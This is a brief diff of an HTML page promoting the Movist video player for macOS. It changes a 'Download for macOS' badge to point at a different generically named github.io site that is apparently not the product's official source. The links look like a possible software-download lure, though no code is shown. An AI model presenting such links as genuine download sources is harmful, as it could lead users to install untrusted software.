@@ -6,7 +6,7 @@
 <h3>Movist for macOS</h3>
 <p>Movist is a specialized video player for macOS with advanced formats support designed for users who want a reliable, Mac‑native tool with clear controls and stable performance.</p>
 
-<a href="https://install-software-utility.github.io/.github/">
+<a href="https://software-app-osx-install.github.io/.github/mov">
   <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
